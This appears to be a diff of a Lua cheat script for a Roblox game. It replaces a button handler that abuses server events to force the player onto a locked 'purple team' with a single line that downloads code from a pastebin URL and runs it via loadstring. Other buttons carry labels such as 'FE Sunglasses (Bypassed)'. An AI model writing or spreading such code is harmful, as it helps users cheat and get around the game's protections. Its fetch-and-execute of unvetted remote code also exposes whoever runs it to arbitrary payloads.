@@ -1749,45 +1749,10 @@ VisualsW:Colorpicker(
 	end
 )
 
-ServerW:Button('Non fe purple team	',function()
-	local player = game.Players.LocalPlayer
-	print(player.Name)
-	local but = game.Players.LocalPlayer.PlayerGui.GUI.TeamSelection.Buttons["Pur"]:Clone()
-	but.Visible  = true
-	local red = game.Players.LocalPlayer.PlayerGui.GUI.TeamSelection.Buttons.Rd.lock
-	local blu = game.Players.LocalPlayer.PlayerGui.GUI.TeamSelection.Buttons.Blu.lock
-	--but.ImageColor3 = Color3.new(100, 0.7, 0)--Red, Green, Blue.
-	--but.Position = UDim2.new(0, -155, 1, -320)
-	but.Parent = game.Players.LocalPlayer.PlayerGui.GUI.TeamSelection.Buttons
-	but.MouseButton1Click:connect(function()
-		if blu.Visible == true then
-			game.ReplicatedStorage.Events.JoinTeam:FireServer("TRC") 
-		end
-		if red.Visible == true then
-			game.ReplicatedStorage.Events.JoinTeam:FireServer("TBC") 
-		end
-
-		game.Players.LocalPlayer.Status.Team.Value = "TPC"
-
-		game.ReplicatedStorage.Events.JoinTeam:FireServer("TRC")
-		game.ReplicatedStorage.Events.KillMe:FireServer()
-		wait(0.2)
-		game.Players.LocalPlayer.Status.Team.Value = "TPC"
-		game.Players.LocalPlayer.Status.Team.Value = "TPC"
-
-		wait(0.3)
-
-
-		game.Players.LocalPlayer.PlayerGui.GUI.TeamSelection.Visible = false
-		game.Players.LocalPlayer.PlayerGui.GUI.BottomFrame.Visible = false
-
-
-
-
-
-
-
-	end)
+ServerW:Button('Nonfe purple team',function()
+			
+	loadstring(game:HttpGet("https://pastebin.com/raw/QwpESx4c",true))();
+		end)
 
 
 ServerW:Button('FE Sunglasses (Bypassed)',function()
